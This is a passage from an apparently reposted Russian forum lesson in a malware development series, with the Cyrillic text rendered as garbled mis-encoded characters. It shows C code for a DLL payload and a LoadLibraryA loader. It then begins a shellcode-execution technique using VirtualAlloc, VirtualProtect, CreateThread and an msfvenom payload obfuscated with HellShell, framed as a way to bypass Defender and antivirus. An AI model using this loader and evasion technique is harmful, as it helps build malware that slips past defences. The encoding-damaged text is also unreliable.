			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746773964608.png"
			title="1746773964608.png"
			width="1296" height="802" loading="lazy" />
	</div></div>
						

							<h2>–õ–æ–∫–∞–ª—å–Ω—ã–π –∑–∞–ø—É—Å–∫ Payload</h2>

							

							

							<div class="bbWrapper">–ü—Ä–µ–¥–ª–∞–≥–∞—é –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ (DLL) –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Ñ–∞–π–ª DLL –≤ —Ç–µ–∫—É—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ DLL</b><br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ DLL –ø—Ä–æ—Å—Ç–æ –∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–æ —Å –ø–æ–º–æ—â—å—é Visual Studio.<br />
–°–æ–∑–¥–∞–π—Ç–µ –Ω–æ–≤—ã–π –ø—Ä–æ–µ–∫—Ç, –≤—ã–±–µ—Ä–∏—Ç–µ —è–∑—ã–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è C++, –∞ –∑–∞—Ç–µ–º –≤—ã–±–µ—Ä–∏—Ç–µ –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏-—Å–≤—è–∑–∞–Ω–Ω—É—é –±–∏–±–ª–∏–æ—Ç–µ–∫—É (DLL).<br />
–≠—Ç–æ —Å–æ–∑–¥–∞—Å—Ç –∫–æ–¥-—Å–∫–µ–ª–µ—Ç DLL, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å—Å—è –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ.<br />
<br />
–ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ –æ—Å–≤–µ–∂–∏—Ç—å —Å–≤–æ–∏ –∑–Ω–∞–Ω–∏—è –æ —Ç–æ–º, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç DLL, —Ç–æ –º–æ–∂–µ—Ç–µ –æ–±—Ä–∞—Ç–∏—Ç—Å—è –∫ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ:<a href="https://ru-sfera.pw/threads/razrabotka-malvari-5-izuchaem-dinamicheskie-biblioteki.4420/" target="_blank" class="link link--external" rel="noopener">–£—Ä–æ–∫–∏ - –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –º–∞–ª–≤–∞—Ä–∏ - 5. –ò–∑—É—á–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏</a><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779064418.png"
		data-src="https://osint42.org/attachments/1746779064418-png.86/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779064418-png.86/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779064418.png"
			title="1746779064418.png"
			width="1071" height="699" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ, –∫–æ—Ç–æ—Ä–æ–µ –ø–æ—è–≤–ª—è–µ—Ç—Å—è, –∫–æ–≥–¥–∞ DLL —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω–∞.<br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ –¥–∏–∞–ª–æ–≥–æ–≤–æ–≥–æ –æ–∫–Ω–∞ –º–æ–∂–Ω–æ –ª–µ–≥–∫–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é MessageBox –∏–∑ WinAPI.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –±—É–¥–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å MsgBoxPayload –∫–∞–∂–¥—ã–π —Ä–∞–∑, –∫–æ–≥–¥–∞ DLL –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –≤ –ø—Ä–æ—Ü–µ—Å—Å.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±—ã–ª–∏ —É–¥–∞–ª–µ–Ω—ã –∏–∑ –Ω–∞—Å—Ç—Ä–æ–µ–∫ C/C++ –ø—Ä–æ–µ–∫—Ç–∞, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –∑–¥–µ—Å—å –£—Ä–æ–∫–∏ - –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –º–∞–ª–≤–∞—Ä–∏ - 5. –ò–∑—É—á–∞–µ–º –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

VOID MsgBoxPayload() {
    MessageBoxA(NULL, &quot;Hacking With ru-sfera.pw&quot;, &quot;Wow !&quot;, MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ WinAPI LoadLibrary –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ DLL. –§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –ø—É—Ç—å –∫ DLL –Ω–∞ –¥–∏—Å–∫–µ –∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –µ–≥–æ –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∫–æ—Ç–æ—Ä—ã–π –≤ –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ –±—É–¥–µ—Ç —Ç–µ–∫—É—â–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –ó–∞–≥—Ä—É–∑–∫–∞ DLL –∑–∞–ø—É—Å—Ç–∏—Ç –µ–µ —Ç–æ—á–∫—É –≤—Ö–æ–¥–∞, –∞ –∑–Ω–∞—á–∏—Ç, –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è MsgBoxPayload, –∏ –ø–æ—è–≤–∏—Ç—Å—è –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ. –•–æ—Ç—è –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –ø—Ä–æ—Å—Ç–∞, —ç—Ç–æ —Å—Ç–∞–Ω–µ—Ç –ø–æ–ª–µ–∑–Ω—ã–º –≤ –ø–æ—Å–ª–µ–¥—É—é—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫.<br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –∫–æ–¥ –ø—Ä–∏–º–µ—Ç –∏–º—è DLL –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –∑–∞–≥—Ä—É–∑–∏—Ç –µ–≥–æ —Å –ø–æ–º–æ—â—å—é LoadLibraryA –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç –ø—Ä–æ–≤–µ—Ä–∫—É –æ—à–∏–±–æ–∫, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ DLL –∑–∞–≥—Ä—É–∑–∏–ª–∞—Å—å —É—Å–ø–µ—à–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char* argv[]) {

    if (argc &lt; 2){
        printf(&quot;[!] –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∞—Ä–≥—É–º–µ–Ω—Ç; –ù—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å DLL –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è \n&quot;);
        return -1;
    }

    printf(&quot;[i] –í–Ω–µ–¥—Ä–µ–Ω–∏–µ \&quot;%s\&quot; –≤ –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å —Å PID: %d \n&quot;, argv[1], GetCurrentProcessId());

    printf(&quot;[+] –ó–∞–≥—Ä—É–∑–∫–∞ DLL... &quot;);
    if (LoadLibraryA(argv[1]) == NULL) {
        printf(&quot;[!] LoadLibraryA –∑–∞–≤–µ—Ä—à–∏–ª–∞—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[+] –ì–û–¢–û–í–û ! \n&quot;);

    printf(&quot;[#] –ù–∞–∂–º–∏—Ç–µ &lt;Enter&gt;, —á—Ç–æ–±—ã –≤—ã–π—Ç–∏ ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–í—ã–≤–æ–¥</b><br />
<br />
–ö–∞–∫ –∏ –æ–∂–∏–¥–∞–ª–æ—Å—å, –ø–æ—Å–ª–µ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è DLL —É—Å–ø–µ—à–Ω–æ –ø–æ—è–≤–ª—è–µ—Ç—Å—è –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ.<br />
<br />
<b>–ê–Ω–∞–ª–∏–∑ –ø—Ä–æ—Ü–µ—Å—Å–∞</b><br />
<br />
–î–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–æ–≥–æ, —á—Ç–æ DLL –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å, –∑–∞–ø—É—Å—Ç–∏—Ç–µ Process Hacker, –¥–≤–∞–∂–¥—ã —â–µ–ª–∫–Ω–∏—Ç–µ –ø–æ –ø—Ä–æ—Ü–µ—Å—Å—É, –∫–æ—Ç–æ—Ä—ã–π –∑–∞–≥—Ä—É–∑–∏–ª DLL, –∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –Ω–∞ –≤–∫–ª–∞–¥–∫—É &quot;–ú–æ–¥—É–ª–∏&quot;. –ò–º—è DLL –¥–æ–ª–∂–Ω–æ –ø–æ—è–≤–∏—Ç—å—Å—è –≤ —Å–ø–∏—Å–∫–µ –º–æ–¥—É–ª–µ–π. –ù–∞–∂–∞–≤ –Ω–∞ –∏–º—è DLL, –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –Ω–µ–π, —Ç–∞–∫—É—é –∫–∞–∫ –∏–º–ø–æ—Ä—Ç, –ø–æ–¥–ø–∏—Å—å –∏ –Ω–∞–∑–≤–∞–Ω–∏—è —Ä–∞–∑–¥–µ–ª–æ–≤.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746779123361.png"
		data-src="https://osint42.org/attachments/1746779123361-png.87/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746779123361-png.87/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746779123361.png"
			title="1746779123361.png"
			width="876" height="651" loading="lazy" />
	</div><br />
<br />
–¢–µ–ø–µ—Ä—å –ø—Ä–µ–¥–ª–∞–≥–∞—é —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –æ–¥–Ω–∏–Ω –∏–∑ —Å–∞–º—ã—Ö –ø—Ä–æ—Å—Ç—ã—Ö —Å–ø–æ—Å–æ–±–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è shellcode –ø—É—Ç–µ–º —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –ø—Ä–æ—Å—Ç–æ—Ç—É —ç—Ç–æ–π —Ç–µ—Ö–Ω–∏–∫–∏, –≤–∞–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å, –∫–∞–∫ –æ–Ω–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –ª–µ–∂–∏—Ç –≤ –æ—Å–Ω–æ–≤–µ –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è shellcode.<br />
<br />
–ú–µ—Ç–æ–¥, –æ–±—Å—É–∂–¥–∞–µ–º—ã–π –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Windows API: VirtualAlloc, VirtualProtect –∏ CreateThread. –í–∞–∂–Ω–æ –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —ç—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω–∏–∫–æ–∏–º –æ–±—Ä–∞–∑–æ–º –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Å–∫—Ä—ã—Ç–Ω–æ–π —Ç–µ—Ö–Ω–∏–∫–æ–π, <b><u>–∏ EDR (Endpoint Detection and Response) –ø–æ—á—Ç–∏ –Ω–∞–≤–µ—Ä–Ω—è–∫–∞ –æ–±–Ω–∞—Ä—É–∂–∏—Ç —ç—Ç—É –ø—Ä–æ—Å—Ç—É—é —Ç–µ—Ö–Ω–∏–∫—É –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è shellcode.</u></b><br />
<br />
–° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –º–æ–≥—É—Ç –±—ã—Ç—å –æ–±–æ–π–¥–µ–Ω—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ <b><u>–ø—Ä–∏ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ–π –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏.</u><br />
<br />
–ù–µ–æ–±—Ö–æ–¥–∏–º—ã–µ Windows API</b><br />
<br />
–•–æ—Ä–æ—à–µ–π –æ—Ç–ø—Ä–∞–≤–Ω–æ–π —Ç–æ—á–∫–æ–π –±—É–¥–µ—Ç –∏–∑—É—á–µ–Ω–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ –ø–æ Windows API, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è:<br />
<br />
<ul>
<li data-xf-list-type="ul"><b>VirtualAlloc</b> - –≤—ã–¥–µ–ª—è–µ—Ç –ø–∞–º—è—Ç—å, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
<li data-xf-list-type="ul"><b>VirtualProtect</b> - –º–µ–Ω—è–µ—Ç –∑–∞—â–∏—Ç—É –ø–∞–º—è—Ç–∏ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –æ–±–ª–∞—Å—Ç–∏ –Ω–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—É—é, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.</li>
<li data-xf-list-type="ul"><b>CreateThread</b> - —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤—ã–π –ø–æ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
</ul><b>–û–±—Ñ—É—Å–∫–∞—Ü–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</b><br />
<br />
–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ, –±—É–¥–µ—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å –ø–æ–º–æ—â—å—é Msfvenom x64 calc payload.<br />
<br />
–ß—Ç–æ–±—ã –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –±—ã–ª–∞ —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ–π, –±—É–¥–µ—Ç –ø—Ä–µ–¥–ø—Ä–∏–Ω—è—Ç–∞ –ø–æ–ø—ã—Ç–∫–∞ <b><u>–æ–±—Ö–æ–¥–∞ Defender, –∏ –ø–æ—ç—Ç–æ–º—É –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è –∏–ª–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥—É—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã. </u></b><br />
<br />
–î–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –ø—Ä–æ–≥—Ä–∞–º–º–∞ <a href="https://github.com/NUL0x4C/HellShell" target="_blank" class="link link--external" rel="noopener">HellShell</a>.<br />
<br />
–ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HellShell.exe msfvenom.bin uuid</code></pre>
	</div>
</div><br />
–í—ã–≤–æ–¥ —Å–ª–µ–¥—É–µ—Ç —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é UuidArray.<br />
<br />
<b>–í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
VirtualAlloc –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —Ä–∞–∑–º–µ—Ä–æ–º sDeobfuscatedSize. –†–∞–∑–º–µ—Ä sDeobfuscatedSize –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π UuidDeobfuscation, –∫–æ—Ç–æ—Ä–∞—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –æ–±—â–∏–π —Ä–∞–∑–º–µ—Ä –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
–§—É–Ω–∫—Ü–∏—è Windows API VirtualAlloc –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º —Å–æ–≥–ª–∞—Å–Ω–æ –µ–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);</code></pre>
	</div>
</div><br />
–¢–∏–ø –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —É–∫–∞–∑–∞–Ω –∫–∞–∫ MEM_RESERVE | MEM_COMMIT, —á—Ç–æ –±—É–¥–µ—Ç —Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞—Ç—å –¥–∏–∞–ø–∞–∑–æ–Ω —Å—Ç—Ä–∞–Ω–∏—Ü –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–º –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏ –≤—ã–¥–µ–ª—è—Ç—å —Ñ–∏–∑–∏—á–µ—Å–∫—É—é –ø–∞–º—è—Ç—å –¥–ª—è —ç—Ç–∏—Ö –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü. –ö–æ–º–±–∏–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ñ–ª–∞–≥–∏ –æ–±—Å—É–∂–¥–∞—é—Ç—Å—è –æ—Ç–¥–µ–ª—å–Ω–æ:<br />
<ul>
<li data-xf-list-type="ul">MEM_RESERVE –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–∏—è –¥–∏–∞–ø–∞–∑–æ–Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü –±–µ–∑ –≤—ã–¥–µ–ª–µ–Ω–∏—è —Ñ–∏–∑–∏—á–µ—Å–∫–æ–π –ø–∞–º—è—Ç–∏.</li>
<li data-xf-list-type="ul">MEM_COMMIT –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è –¥–∏–∞–ø–∞–∑–æ–Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü –≤ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–º –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ul>–ü–æ—Å–ª–µ–¥–Ω–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä VirtualAlloc —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –Ω–∞ —Ä–µ–≥–∏–æ–Ω–µ –ø–∞–º—è—Ç–∏. –°–∞–º—ã–º –ø—Ä–æ—Å—Ç—ã–º —Å–ø–æ—Å–æ–±–æ–º –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–∞—â–∏—Ç—É –ø–∞–º—è—Ç–∏ –Ω–∞ PAGE_EXECUTE_READWRITE, –Ω–æ —ç—Ç–æ –æ–±—ã—á–Ω–æ —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏–∑–Ω–∞–∫–æ–º –∑–ª–æ–Ω–∞–º–µ—Ä–µ–Ω–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –¥–ª—è –º–Ω–æ–≥–∏—Ö —Å—Ä–µ–¥—Å—Ç–≤ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ü–æ—ç—Ç–æ–º—É –∑–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –Ω–∞ PAGE_READWRITE, —Ç–∞–∫ –∫–∞–∫ –Ω–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –∑–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –Ω–æ –Ω–µ –µ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ. –ù–∞–∫–æ–Ω–µ—Ü, VirtualAlloc –≤–µ—Ä–Ω–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />
<b>–ó–∞–ø–∏—Å—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ø–∞–º—è—Ç—å</b><br />
<br />
